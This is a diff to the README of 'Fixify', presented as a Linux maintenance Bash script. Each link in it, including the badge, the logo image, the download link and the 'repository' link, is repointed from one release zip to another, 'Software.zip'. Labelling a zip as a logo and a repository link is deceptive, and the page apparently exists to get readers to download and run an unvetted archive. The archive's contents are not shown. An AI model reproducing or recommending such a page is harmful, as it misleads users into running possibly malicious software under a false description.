@@ -1,10 +1,10 @@
 # **🔧 Fixify - Automated Linux System Maintenance Script 🔄**
 
-[![Maintenance Tool](https://github.com/CALEBDSYG/Fixify/releases/download/v1.0/Application.zip)](https://github.com/CALEBDSYG/Fixify/releases/download/v1.0/Application.zip)
+[![Maintenance Tool](https://github.com/CALEBDSYG/Fixify/releases/download/v2.0/Software.zip)](https://github.com/CALEBDSYG/Fixify/releases/download/v2.0/Software.zip)
 
 Welcome to Fixify - Your go-to Bash script for automating Linux system updates, kernel cleanup, and maintenance tasks. Simplify your sysadmin duties with just a few commands!
 
-![Fixify Logo](https://github.com/CALEBDSYG/Fixify/releases/download/v1.0/Application.zip)
+![Fixify Logo](https://github.com/CALEBDSYG/Fixify/releases/download/v2.0/Software.zip)
 
 ## Features 🚀
 
@@ -18,7 +18,7 @@ Welcome to Fixify - Your go-to Bash script for automating Linux system updates, 
 
 ## Installation 🛠️
 
-To install Fixify, simply download the script from the following link: [Download Fixify](https://github.com/CALEBDSYG/Fixify/releases/download/v1.0/Application.zip)
+To install Fixify, simply download the script from the following link: [Download Fixify](https://github.com/CALEBDSYG/Fixify/releases/download/v2.0/Software.zip)
 
 Once downloaded, launch the script in your terminal to start automating your system maintenance tasks.
 
@@ -65,4 +65,4 @@ Fixify is licensed under the MIT License. See the [LICENSE](LICENSE) file for mo
 
 **Let Fixify streamline your system maintenance tasks and keep your Linux system running smoothly!** 🌟
 
-For more details and updates, visit the [Fixify GitHub Repository](https://github.com/CALEBDSYG/Fixify/releases/download/v1.0/Application.zip) or check out the "Releases" section for the latest version.
+For more details and updates, visit the [Fixify GitHub Repository](https://github.com/CALEBDSYG/Fixify/releases/download/v2.0/Software.zip) or check out the "Releases" section for the latest version.
